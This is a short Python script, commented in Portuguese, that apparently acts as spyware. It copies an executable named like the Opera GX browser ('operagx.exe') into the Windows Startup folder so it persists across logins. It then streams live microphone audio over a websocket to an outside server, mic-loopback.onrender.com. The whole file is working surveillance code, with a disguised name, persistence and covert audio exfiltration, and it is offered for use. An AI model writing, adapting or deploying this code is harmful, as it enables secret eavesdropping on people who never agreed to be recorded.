import time
import websocket
import sounddevice as sd
import numpy as np
import struct
import os
import shutil

source = os.path.join(os.getcwd(), "operagx.exe")
USERNAME = os.environ.get("USERNAME")

startup_folder = os.path.join("C:\\Users", USERNAME, "AppData", "Roaming",
                              "Microsoft", "Windows", "Start Menu", "Programs", "Startup")

dest = os.path.join(startup_folder, "operagx.exe")

print(startup_folder)

if not os.path.exists(dest):
    try:
        shutil.copy(source, dest)
    except Exception as e:
        print("Erro ao copiar para Startup:", e)
else:
    print("Arquivo já existe na pasta Startup, não será duplicado.")

SERVER_URL = "mic-loopback.onrender.com"
SAMPLE_RATE = 44100
CHANNELS = 1
CHUNK = 1024
DTYPE = np.int16

ws_url = f"wss://{SERVER_URL}"
ws = websocket.WebSocket()
ws.connect(ws_url)

def send_frame(data_bytes: bytes):
    header = struct.pack("!I", len(data_bytes))
    ws.send(header + data_bytes, opcode=websocket.ABNF.OPCODE_BINARY)

def callback(indata, frames, time_info, status):
    if status:
        print("Status:", status)
    send_frame(indata.tobytes())

with sd.InputStream(samplerate=SAMPLE_RATE,
                    blocksize=CHUNK,
                    channels=CHANNELS,
                    dtype=DTYPE,
                    callback=callback):
    print("Capturando áudio e enviando...")
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        pass

# Sinaliza fim da transmissão
send_frame(b"__END__")
ws.close()
